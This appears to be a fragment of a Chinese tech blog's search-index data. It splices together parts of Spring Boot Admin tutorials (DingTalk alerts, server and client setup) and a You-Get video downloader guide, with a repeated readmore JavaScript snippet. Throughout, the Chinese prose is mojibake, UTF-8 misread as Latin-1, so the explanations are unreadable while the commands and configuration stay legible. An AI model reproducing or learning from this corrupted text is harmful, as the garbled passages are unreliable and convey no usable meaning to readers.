pom.xml é…ç½®æ–‡ä»¶é‡Œæ·»åŠ ä»¥ä¸‹ä¾èµ–ã€‚ 12345&lt;dependency&gt; &lt;groupId&gt;com.dingtalk&lt;/groupId&gt; &lt;artifactId&gt;dingtalk-api-sdk&lt;/artifactId&gt; &lt;version&gt;1.0.0&lt;/version&gt;&lt;/dependency&gt; å®‰è£…é’‰é’‰ SDK åˆ°æœ¬åœ° Maven ä»“åº“çš„å‘½ä»¤å¦‚ä¸‹ï¼š 1$ mvn install:install-file -Dfile=taobao-sdk-java-auto_1455552377940-20200322.jar -DgroupId=com.dingtalk -DartifactId=dingtalk-api-sdk -Dversion=1.0.0 -Dpackaging=jar å€¼å¾—ä¸€æçš„æ˜¯ï¼Œä¸åŒç‰ˆæœ¬çš„ é’‰é’‰ SDKï¼Œå…¶ Maven åæ ‡ä¸­çš„ groupIdã€artifactIdã€version å¯èƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼Œæ­¤æ—¶åªéœ€è¦å°†ä¸Šé¢å¯¹åº”çš„å‚æ•°å€¼æ›¿æ¢æ‰å³å¯ã€‚ ç”Ÿäº§ç¯å¢ƒæ‰©å±•å»ºè®®ä¸Šè¿°ç»™å‡ºçš„æ˜¯ Spring Boot Admin é›†æˆé’‰é’‰ç¾¤æœºå™¨äººæ¶ˆæ¯é€šçŸ¥çš„ Demo ä»£ç ï¼Œç”Ÿäº§ç¯å¢ƒä¸‹è¿˜éœ€è¦è€ƒè™‘åˆ°å¦‚ä¸‹çš„å®é™…é—®é¢˜ï¼š æŠ¥è­¦æ¶ˆæ¯é‡å¤å‘é€ï¼šè‹¥ Admin åº”ç”¨ä»¥é›†ç¾¤çš„æ–¹å¼éƒ¨ç½²ï¼Œå½“ A åº”ç”¨ DOWN æ‰åï¼Œé‚£ä¹ˆé’‰é’‰ç¾¤æˆå‘˜å°†ä¼šæ”¶åˆ°å¤šæ¡ A åº”ç”¨æœåŠ¡çŠ¶æ€å˜æ›´çš„æŠ¥è­¦æ¶ˆæ¯ æŠ¥è­¦æ¶ˆæ¯çš„æŒä¹…åŒ–ï¼šè‹¥å¤§é‡æŠ¥è­¦æ¶ˆæ¯ç§¯å‹åœ¨ Admin åº”ç”¨é‡Œï¼Œä½†è¿˜æ²¡æ¥å¾—åŠå‘é€ï¼Œæ­¤æ—¶å¦‚æœ Admin åº”ç”¨æŒ‚æ‰ï¼Œé‚£ä¹ˆæŠ¥è­¦æ¶ˆæ¯å°†ä¼šä¸¢å¤±ï¼Œå»ºè®®ä½¿ç”¨ æ¶ˆæ¯ä¸­é—´ä»¶ çš„æŒä¹…åŒ–ç‰¹æ€§æ¥è§£å†³ æŠ¥è­¦æ¶ˆæ¯çš„å‘é€é¢‘ç‡ï¼šæ¯ä¸ªé’‰é’‰ç¾¤æœºå™¨äººæ¯åˆ†é’Ÿæœ€å¤šå‘é€ 20 æ¡ï¼Œå¦‚æœè¶…è¿‡ 20 æ¡ï¼Œä¼šé™æµ 10 åˆ†é’Ÿï¼›è¿™é‡Œå»ºè®®åˆ©ç”¨ ä»»åŠ¡è°ƒåº¦çº¿ç¨‹æ±  æ¥å®ç°æŠ¥è­¦æ¶ˆæ¯çš„è°ƒåº¦å‘é€ï¼ŒåŒæ—¶è€ƒè™‘å°†å¤šæ¡æŠ¥è­¦æ¶ˆæ¯åˆå¹¶åå†å‘é€ï¼Œä»¥æ­¤æ¥è§£å†³æŠ¥è­¦æ¶ˆæ¯å‘é€é¢‘ç‡å—é™åˆ¶çš„é—®é¢˜ å‚è€ƒåšå®¢ Java åˆ©ç”¨é’‰é’‰æœºå™¨äººå‘é’‰é’‰ç¾¤æ¨é€æ¶ˆæ¯ Spring Boot Admin å®˜æ–¹é›†æˆå„ç±»æ¶ˆæ¯é€šçŸ¥çš„æºç å®ç° Spring Boot Admin 2.0.1 é›†æˆè‡ªå®šä¹‰ç›‘æ§å‘Šè­¦ - é’‰é’‰æœºå™¨äºº ä¸€ä¸ªç®¡ç†å¼‚å¸¸é€šçŸ¥çš„ Starterï¼Œå®ç°äº†é’‰é’‰æ¶ˆæ¯æé†’ä¸é‚®ä»¶æé†’ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡"},{title:"æ•°æ®ç»“æ„ä¸ç®—æ³•ä¹‹ä¸€",url:"/posts/6f42c94c.html",text:'å‰è¨€ ç¼–ç¨‹å››å¤§åŸºç¡€ï¼šæ•°æ®ç»“æ„ä¸ç®—æ³•ã€è®¡ç®—æœºç½‘ç»œã€æ“ä½œç³»ç»Ÿã€è®¾è®¡æ¨¡å¼ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ç®—æ³•ä¸æ•°æ®ç»“æ„"},{title:"You-Get å®‰è£…ä½¿ç”¨ä¸ä»‹ç»",url:"/posts/4d770034.html",text:'å‰è¨€ You-Get æ˜¯ä¸€ä¸ªåŸºäº Python3 çš„ä¸‹è½½å·¥å…·ï¼Œå¯ä»¥å¾ˆè½»æ¾åœ°ä¸‹è½½åˆ°ç½‘ç»œä¸Šçš„è§†é¢‘ã€å›¾ç‰‡åŠéŸ³ä¹èµ„æºï¼Œé»˜è®¤æ”¯æŒ YouTubeã€å“”å“©å“”å“©ã€ä¼˜é…·ã€çˆ±å¥‡è‰ºã€è…¾è®¯è§†é¢‘ç­‰è§†é¢‘ç½‘ç«™çš„ä¸‹è½½ã€‚ä¸‹é¢å°†ä»‹ç»åœ¨ Linux ç³»ç»Ÿä¸‹å¦‚ä½•ä½¿ç”¨ You-Getï¼Œæ­¤æ•™ç¨‹é€‚ç”¨äº Centos/Debian/Ubuntu ç­‰ Linux å‘è¡Œç‰ˆã€‚ ä¾èµ–è¯´æ˜ ä»¥ä¸‹æ˜¯å¿…è¦çš„ä¾èµ–ï¼Œéœ€è¦æå‰å•ç‹¬å®‰è£…ï¼Œé™¤éæ˜¯åœ¨ Windows ç³»ç»Ÿä¸‹ä½¿ç”¨é¢„å®‰è£…åŒ…ï¼š Python 3.2+ FFmpeg 1.0+ RTMPDumpï¼ˆå¯é€‰ï¼‰ é€šè¿‡ PIP å®‰è£… You-Get çš„å®˜æ–¹ç‰ˆæœ¬é€šè¿‡ PyPI åˆ†å‘ï¼Œå¯ä» PyPI é•œåƒä¸­é€šè¿‡ pip åŒ…ç®¡ç†å™¨å®‰è£…ï¼ŒåŠ¡å¿…ä½¿ç”¨ Python3 çš„ pipã€‚ 1$ pip3 install you-get è½¯ä»¶ç‰ˆæœ¬å‡çº§ 1$ pip3 install --upgrade you-get ä¸‹è½½è§†é¢‘ å½“è§‚èµåˆ°æ„Ÿå…´è¶£çš„è§†é¢‘ï¼Œå¯ä»¥ä½¿ç”¨ --info/-i å‚æ•°æ¥æŸ¥çœ‹è§†é¢‘çš„æ‰€æœ‰å¯ç”¨ç”»è´¨ä¸æ ¼å¼: 123456789101112131415161718192021222324252627282930$ you-get -i \'https://www.youtube.com/watch?v=jNQXAC9IVRw\'site: YouTubetitle: Me at the zoostreams: # Available quality and codecs [ DEFAULT ] _________________________________ - itag: 43 container: webm quality: medium size: 0.5 MiB (564215 bytes) # download-with: you-get --itag=43 [URL] - itag: 18 container: mp4 quality: medium # download-with: you-get --itag=18 [URL] - itag: 5 container: flv quality: small # download-with: you-get --itag=5 [URL] - itag: 36 container: 3gp quality: small # download-with: you-get --itag=36 [URL] - itag: 17 container: 3gp quality: small # download-with: you-get --itag=17 [URL] æ ‡æœ‰ DEFAULT çš„ä¸ºé»˜è®¤ç”»è´¨ï¼Œä¸€èˆ¬æƒ…å†µä¸‹å¯ç›´æ¥ä¸‹è½½ï¼Œå¦‚ YouTube è§†é¢‘å¸¦æœ‰å­—å¹•ï¼Œé‚£è¾¹å­—å¹•å°†è¢«ä¸€åŒä¸‹è½½ï¼Œä»¥ SubRip æ ¼å¼ä¿å­˜ï¼š 1234567891011121314$ you-get \'https://www.youtube.com/watch?v=jNQXAC9IVRw\'site: YouTubetitle: Me at the zoostream: - itag: 43 container: webm quality: medium size: 0.5 MiB (564215 bytes) # download-with: you-get --itag=43 [URL]Downloading zoo.webm ...100.0% ( 0.5/0.5 MB) â”œâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”¤[1/1] 7 MB/sSaving Me at the zoo.en.srt ...Done. æ³¨æ„: æ‰¹é‡ä¸‹è½½å¯ä»¥ä½¿ç”¨å‚æ•° --playlist ç›®å‰ï¼Œè§†é¢‘æ ¼å¼é€‰æ‹©æ²¡æœ‰å¤§è§„æ¨¡é“ºå¼€ï¼Œé»˜è®¤é€‰é¡¹ä¸ºæœ€é«˜ç”»è´¨ ffmpeg ä¸ºå¿…è¦ä¾èµ–ï¼Œç”¨äºä¸‹è½½æµå¼è§†é¢‘ä»¥åŠåˆå¹¶åˆ†å—è§†é¢‘ (ä¾‹å¦‚ Youku)ï¼Œä»¥åŠ YouTube çš„ 1080p æˆ–æ›´é«˜åˆ†è¾¨ç‡çš„è§†é¢‘ å¦‚æœä¸å¸Œæœ› You-Get åˆå¹¶è§†é¢‘ï¼Œå¯ä»¥ä½¿ç”¨ --no-merge/-n ä¸‹è½½å…¶ä»–å†…å®¹ ç›´æ¥ä½¿ç”¨ URL ä¸‹è½½å›¾ç‰‡ï¼Œæ­¤åŠŸèƒ½ä¸ºæµ‹è¯•æ€§ï¼Œè¿œæœªå®Œæˆï¼›å¯¹äºç±»ä¼¼ Tumblr å’Œ Blogger çš„å¤§å›¾æœ‰æ•ˆï¼Œä½†æ˜¯æ²¡æœ‰åŠæ³•ä¸ºæ‰€æœ‰ç½‘ç«™å»ºç«‹é€šç”¨æ ¼å¼ã€‚ 12345678$ you-get https://stallman.org/rms.jpgSite: stallman.orgTitle: rmsType: JPEG Image (image/jpeg)Size: 0.06 MiB (66482 Bytes)Downloading rms.jpg ...100.0% ( 0.1/0.1 MB) â”œâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”¤[1/1] 127 kB/s æš‚åœä¸æ¢å¤ä¸‹è½½ å¯ä»¥ä½¿ç”¨ Ctrl+C æš‚åœä¸‹è½½ï¼Œä¸´æ—¶çš„ .download æ–‡ä»¶å°†ä¿å­˜äºè¾“å‡ºç›®å½•ã€‚ä¸‹æ¬¡ä½¿ç”¨ You-Get ä¼ å…¥ç›¸åŒå‚æ•°æ—¶ï¼Œä¸‹è½½å°†ä»ä¸Šæ¬¡ç»§ç»­å¼€å§‹ã€‚å¦‚æœä¸‹è½½å·²ç»å®Œæˆï¼Œä¸´æ—¶çš„ .download æ‰©å±•åæ–‡ä»¶å°†ä¼šè¢«åˆ é™¤ï¼Œæ­¤æ—¶ You-Get å°†å¿½ç•¥ä¸‹è½½ã€‚å¯ä»¥ç”¨ --force/-f å¼ºè¡Œé‡æ–°ä¸‹è½½ï¼Œä¼šè¦†ç›–åŒåæ–‡ä»¶æˆ–ä¸´æ—¶æ–‡ä»¶ï¼ è®¾ç½®è¾“å‡ºè·¯å¾„æˆ–æ–‡ä»¶å ä½¿ç”¨ --output-dir/-o è®¾ç½®è·¯å¾„ï¼Œ--output-filename/-O è®¾ç½®è¾“å‡ºæ–‡ä»¶åï¼š 1$ you-get -o ~/Videos -O zoo.webm \'https://www.youtube.com/watch?v=jNQXAC9IVRw\' æç¤º: æ­¤å‚æ•°å¯ä»¥å¸®åŠ©ä½¿ç”¨è„šæœ¬æ‰¹é‡ä¸‹è½½äºæŒ‡å®šç›®å½•å’Œæ–‡ä»¶å å¦‚æœåŸè§†é¢‘æ ‡é¢˜åŒ…å«æœ‰ä¸ç³»ç»Ÿä¸å…¼å®¹çš„å­—ç¬¦ï¼Œæ­¤å‚æ•°ååˆ†æœ‰æ•ˆ ä»£ç†è®¾ç½® ä½¿ç”¨ --http-proxy/-x ä¸º You-Get è®¾ç½® HTTP ä»£ç†ï¼ŒåŒæ—¶ç³»ç»Ÿä»£ç† (å³ç³»ç»Ÿå˜é‡ http_proxy) ä¼šè‡ªåŠ¨ç”Ÿæ•ˆï¼Œä½¿ç”¨ --no-proxy åˆ™å¯ä»¥å¼ºè¡Œå…³é—­ä»£ç†ï¼š 1$ you-get -x 127.0.0.1:8087 \'https://www.youtube.com/watch?v=jNQXAC9IVRw\' æç¤º: å¦‚æœç»å¸¸ä½¿ç”¨ä»£ç† (ç½‘ç»œå°é”äº†éƒ¨åˆ†ç½‘ç«™)ï¼Œè€ƒè™‘å°† You-Get å’Œ ProxyChains ä¸€åŒä½¿ç”¨ï¼Œå¹¶åœ¨å‘½ä»¤è¡Œä¸­è®¾ç½® alias you-get="proxychains -q you-get" å¯¹äºæŸäº›ç½‘ç«™ (ä¾‹å¦‚ Youku)ï¼Œå¦‚æœä½ éœ€è¦ä¸‹è½½ä»…ä¾›ä¸­å›½å¤§é™†è§‚çœ‹çš„è§†é¢‘ï¼Œå¯ä»¥ä½¿ç”¨ --extractor-proxy/-y å•ç‹¬ä¸ºè§£æå™¨è®¾ç½®ä»£ç†ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ -y proxy.uku.im:8888 (é¸£è°¢ï¼š Unblock Youku é¡¹ç›®) æ’­æ”¾è§†é¢‘ ä½¿ç”¨ --player/-p å°†è§†é¢‘æŠ•å–‚ç»™æ’­æ”¾å™¨ï¼Œä¾‹å¦‚ mplayer æˆ–è€… vlcï¼Œè€Œä¸æ˜¯ä¸‹è½½è§†é¢‘ï¼š 1$ you-get -p vlc \'https://www.youtube.com/watch?v=jNQXAC9IVRw\' æˆ–è€…æƒ³åœ¨æµè§ˆå™¨ä¸­è§‚çœ‹è€Œä¸å¸Œæœ›çœ‹å¹¿å‘Šæˆ–è¯„è®ºåŒº: 1$ you-get -p chromium \'https://www.youtube.com/watch?v=jNQXAC9IVRw\' æç¤ºï¼šå¯ä»¥ä½¿ç”¨ -p å¼€å¯ä¸‹è½½å·¥å…·ï¼Œä¾‹å¦‚ you-get -p uget-gtk \'https://www.youtube.com/watch?v=jNQXAC9IVRw\'ï¼Œè™½ç„¶æœ‰å¯èƒ½ä¸çµã€‚ åŠ è½½ Cookie å¹¶éæ‰€æœ‰è§†é¢‘å¯ä¾›ä»»ä½•äººè§‚çœ‹ï¼Œå¦‚æœéœ€è¦ç™»å½•æ‰å¯ä»¥è§‚çœ‹ (ä¾‹å¦‚ä¼šå‘˜è§†é¢‘)ï¼Œé‚£ä¹ˆå¯èƒ½å¿…é¡»å°†æµè§ˆå™¨çš„ cookie é€šè¿‡ --cookies/-c åŠ è½½å…¥ You-Getï¼Œç›®å‰æ”¯æŒä¸¤ç§ cookie æ ¼å¼ï¼šMozilla cookies.sqlite å’Œ Netscape cookies.txtã€‚ å¤ç”¨è§£ææ•°æ® ä½¿ç”¨ --url/-u è·å¾—é¡µé¢æ‰€æœ‰å¯ä¸‹è½½ URL åˆ—è¡¨ï¼Œä½¿ç”¨ --json å‚æ•°åˆ™å¯ä»¥è·å¾— JSON æ ¼å¼çš„æ•°æ®ï¼Œç›®å‰æ­¤åŠŸèƒ½æœªå®šå‹ï¼ŒJSON æ ¼å¼æœªæ¥æœ‰å¯èƒ½å˜åŒ–ã€‚ å“”å“©å“”å“©æ‰¹é‡ä¸‹è½½è„šæœ¬ é’ˆå¯¹å“”å“©å“”å“©çš„è§†é¢‘ï¼Œè‹¥æ‰¹é‡ä¸‹è½½å‚æ•° --playlist ä¸é€‚ç”¨ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ Shell è„šæœ¬å®ç°æ‰¹é‡ä¸‹è½½ï¼Œä¼ å…¥çš„å‚æ•°åŒ…æ‹¬ï¼šURLã€å¼€å§‹é›†æ•°ã€ç»“æŸé›†æ•°ã€‚å¦‚æœå¸Œæœ›åŒæ—¶æ‰§è¡Œå¤šä¸ªä¸‹è½½ä»»åŠ¡ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨ä¸åŒçš„å‚æ•°æ¥å¤šæ¬¡æ‰§è¡Œè„šæœ¬ï¼Œæ­¤æ“ä½œç”±äºé¢‘ç¹è®¿é—®å“”å“©å“”å“©çš„è§†é¢‘ç½‘ç«™ï¼Œå­˜åœ¨ IP è¢«å°çš„é£é™©ï¼ˆHttp è¯·æ±‚è¿”å› 403 é”™è¯¯ç ï¼‰ã€‚ 12#!/bin/shfor i in $(seq $2 $3); do you-get $1$i; done æˆ–è€…æ§åˆ¶æ¯æ¬¡æ‰§è¡Œä¸‹è½½ä»»åŠ¡ä¹‹å‰éƒ½ç­‰å¾… N ç§’ï¼ˆå»ºè®® 40 &lt;= N &lt;= 60ï¼‰ï¼Œé˜²æ­¢è¿ç»­å¤šæ¬¡ä¸‹è½½å¤±è´¥æ—¶ï¼Œé¢‘ç¹è®¿é—®æœåŠ¡å™¨å¯¼è‡´ IP è¢«å°ï¼š 12#!/bin/shfor i in $(seq $2 $3); do sleep 40 &amp;&amp; you-get $1$i; done Shell è„šæœ¬ä½¿ç”¨ç¤ºä¾‹ï¼š 1sh bilibil.sh https://www.bilibili.com/video/av33087749/?p= 1 3 å‚è€ƒèµ„æ–™ You-Get å®˜æ–¹è‹±æ–‡ä½¿ç”¨è¯´æ˜ You-Get å®˜æ–¹ä¸­æ–‡ä½¿ç”¨è¯´æ˜ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"Spring Boot Admin åŸºç¡€ä½¿ç”¨æ•™ç¨‹",url:"/posts/748546b6.html",text:'1ã€Admin ç®€ä»‹Spring Boot Admin æ˜¯ä¸€ä¸ªå¼€æºç¤¾åŒºé¡¹ç›®ï¼Œç”¨äºç®¡ç†å’Œç›‘æ§ Spring Boot åº”ç”¨ç¨‹åºã€‚ åº”ç”¨ç¨‹åºä½œä¸º Spring Boot Admin Client å‘ä¸º Spring Boot Admin Server æ³¨å†Œï¼ˆé€šè¿‡ HTTP åè®®ï¼‰æˆ–ä½¿ç”¨ Spring Cloud æ³¨å†Œä¸­å¿ƒï¼ˆä¾‹å¦‚ Eurekaã€Consulï¼‰çš„æœåŠ¡å‘ç°ã€‚UI æ˜¯çš„ AngularJs åº”ç”¨ç¨‹åºï¼Œç”¨äºå±•ç¤º Spring Boot Admin Client çš„ Actuator ç«¯ç‚¹ä¸Šçš„ä¸€äº›ç›‘æ§æ•°æ®ã€‚Spring Boot Admin é»˜è®¤æä¾›äº†å¦‚ä¸‹åŠŸèƒ½ï¼ˆåŒ…æ‹¬ä½†ä¸é™äºï¼‰ï¼š æ˜¾ç¤ºå¥åº·çŠ¶æ€åŠè¯¦ç»†ä¿¡æ¯ï¼Œå¦‚ JVM å’Œå†…å­˜æŒ‡æ ‡ã€æ•°æ®æºæŒ‡æ ‡ã€ç¼“å­˜æŒ‡æ ‡ æ˜¾ç¤ºæ„å»ºä¿¡æ¯ç¼–å· è·Ÿè¸ªå¹¶ä¸‹è½½æ—¥å¿—æ–‡ä»¶ æŸ¥çœ‹ JVM ç³»ç»Ÿå’Œç¯å¢ƒå±æ€§ æŸ¥çœ‹ Spring Boot é…ç½®å±æ€§ è½»æ¾çš„æ—¥å¿—çº§åˆ«ç®¡ç† ä¸ JMX-Beans äº¤äº’ æŸ¥çœ‹çº¿ç¨‹è½¬å‚¨ æŸ¥çœ‹ Http è·Ÿè¸ª æŸ¥çœ‹ auditevents æŸ¥çœ‹ http-endpoints æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ æŸ¥çœ‹å’Œåˆ é™¤æ´»åŠ¨ä¼šè¯ï¼ˆåŸºäº Spring-Sessionï¼‰ æŸ¥çœ‹ Flyway/Liquibase æ•°æ®åº“è¿ç§» ä¸‹è½½ heapdump æ–‡ä»¶ çŠ¶æ€å˜æ›´é€šçŸ¥ï¼ˆæ”¯æŒç”µå­é‚®ä»¶ã€Slackã€Hipchat â€¦ï¼‰ çŠ¶æ€æ›´æ”¹çš„äº‹ä»¶æ—¥å¿—ï¼ˆéæŒä¹…æ€§ï¼‰ ç‰¹åˆ«æ³¨æ„ï¼šSpring Boot Admin é»˜è®¤ä¸æ”¯æŒç›‘æ§æ•°æ®çš„æŒä¹…åŒ–ï¼Œè‹¥å¯¹æ•°æ®çš„æŒä¹…åŒ–æœ‰è¦æ±‚ï¼Œå»ºè®®è€ƒè™‘ä½¿ç”¨ Metricsã€CATã€Prometheus + Grafana ç­‰ç›‘æ§å¹³å°ã€‚ 2ã€Admin å¿«é€Ÿå…¥é—¨2.1ã€ç‰ˆæœ¬è¯´æ˜åœ¨æœ¬æ–‡ä¸­ï¼Œä½¿ç”¨çš„ Spring Cloud ç‰ˆæœ¬æ˜¯ Hoxton.SR1ï¼Œå¯¹åº”çš„ Spring Boot ç‰ˆæœ¬æ˜¯ 2.2.2.RELEASEï¼Œç‰¹åˆ«å£°æ˜é™¤å¤–ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ 2.2ã€åˆ›å»º Maven çˆ¶çº§ Pom å·¥ç¨‹åœ¨çˆ¶å·¥ç¨‹é‡Œé¢é…ç½®å¥½å·¥ç¨‹éœ€è¦çš„çˆ¶çº§ä¾èµ–ï¼Œç›®çš„æ˜¯ä¸ºäº†æ›´æ–¹ä¾¿ç®¡ç†ä¸ç®€åŒ–é…ç½®ï¼Œå…·ä½“ Maven é…ç½®å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.2.2.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- ç®¡ç†ä¾èµ– --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Hoxton.SR1&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--æ³¨æ„ï¼šè¿™é‡Œéœ€è¦æ·»åŠ ä»¥ä¸‹é…ç½®ï¼Œå¦åˆ™å¯èƒ½ä¼šæœ‰å„ç§ä¾èµ–é—®é¢˜ --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; 2.3ã€åˆ›å»º Admin Server å·¥ç¨‹åˆ›å»º Admin Server çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼š 123456789&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;de.codecentric&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-admin-starter-server&lt;/artifactId&gt; &lt;version&gt;2.3.0&lt;/version&gt;&lt;/dependency&gt; æ·»åŠ  Admin Server éœ€è¦çš„ application.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ï¼š 123456server: port: 9001spring: application: name: admin-server åˆ›å»º Admin Server çš„ä¸»å¯åŠ¨ç±»ï¼Œå¼•å…¥ @EnableAdminServer æ³¨è§£ï¼š 12345678@EnableAdminServer@SpringBootApplicationpublic class AdminServerApplication { public static void main(String[] args) { SpringApplication.run(AdminServerApplication.class, args); }} 2.4ã€åˆ›å»º Admin Client å·¥ç¨‹åˆ›å»º Admin Client çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼š 12345678910111213&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;de.codecentric&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-admin-starter-client&lt;/artifactId&gt; &lt;version&gt;2.3.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt; æ·»åŠ  Admin Client éœ€è¦çš„ application.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ï¼Œå…¶ä¸­ spring.boot.admin.client.url æ˜¯ Admin Server çš„åœ°å€ï¼Œç›®çš„æ˜¯å°† Admin Client æ³¨å†Œåˆ° Admin Server ä¸­ï¼Œæœ€åæš´éœ² Admin Client çš„ Actuator çš„æ‰€æœ‰ç«¯å£ï¼š 123456789101112131415161718192021server: port: 9002spring: application: name: admin-client boot: admin: client: url: http://127.0.0.1:9001 #Spring Boot Admin Server çš„åœ°å€ instance: prefer-ip: true #å°†IPæ³¨å†Œåˆ°Admin Serverä¸Šï¼Œè‹¥ä¸é…ç½®é»˜è®¤ä½¿ç”¨æœºå™¨çš„ä¸»æœºåmanagement: endpoints: web: exposure: include: "*" endpoint: health: show-details: ALWAYS åˆ›å»º Admin Client çš„ä¸»å¯åŠ¨ç±»ï¼š 1234567@SpringBootApplicationpublic class AdminClientApplication { public static void main(String[] args) { SpringApplication.run(AdminClientApplication.class, args); }} 2.5ã€æµ‹è¯•ç»“æœ 1ï¼‰ä¾æ¬¡å¯åŠ¨ admin-serverã€admin-client åº”ç”¨ç¨‹åº 2ï¼‰æµè§ˆå™¨è®¿é—® http://127.0.0.1:9001/ï¼Œæ‰“å¼€ Admin Server çš„ä¸»ç•Œé¢ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š 3ï¼‰ç‚¹å‡»å®ä¾‹ä¿¡æ¯é“¾æ¥è·³è½¬åˆ°è¯¦ç»†é¡µé¢ï¼Œå¯ä»¥æŸ¥çœ‹å®ä¾‹çš„è¯¦ç»†ç›‘æ§ä¿¡æ¯ï¼Œå¦‚å›¾æ‰€ç¤º 3ã€Admin åœ¨çº¿æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶Spring Boot Admin æä¾›äº†åŸºäº Web é¡µé¢çš„æ–¹å¼å®æ—¶æŸ¥çœ‹ä¸šåŠ¡æœåŠ¡è¾“å‡ºçš„æœ¬åœ°æ—¥å¿—ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œå‰ææ˜¯ä¸šåŠ¡æœåŠ¡ä¸­é…ç½®äº† logging.fileï¼Œå³åœ¨è¢«ç›‘æ§çš„ä¸šåŠ¡æ¨¡å—çš„ application.yml é…ç½®æ–‡ä»¶ä¸­å¢åŠ ä¸‹é¢çš„å†…å®¹ï¼š 12logging: file: /tmp/admin/client.log 3.1ã€æºç 